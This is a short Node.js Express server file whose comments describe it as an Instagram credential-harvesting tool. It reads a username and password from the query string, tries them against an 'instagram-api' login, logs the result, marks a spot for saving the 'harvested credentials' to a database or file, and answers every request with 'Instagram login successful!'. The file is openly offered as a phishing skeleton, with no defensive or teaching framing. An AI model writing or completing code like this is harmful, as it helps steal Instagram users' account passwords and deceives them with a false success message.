const express = require('express');
const app = express();
const instagram = require('instagram-api');

app.get('/', (req, res) => {
    // Handle Instagram login and credential harvesting here
    const username = req.query.username;
    const password = req.query.password;

    // Use the Instagram API to log in and harvest credentials
    instagram.login(username, password, (err, result) => {
        if (err) {
            console.error(err);
        } else {
            console.log(result);
            // Save the harvested credentials to a database or file
        }
    });

    res.send('Instagram login successful!');
});

const port = 8080;
app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
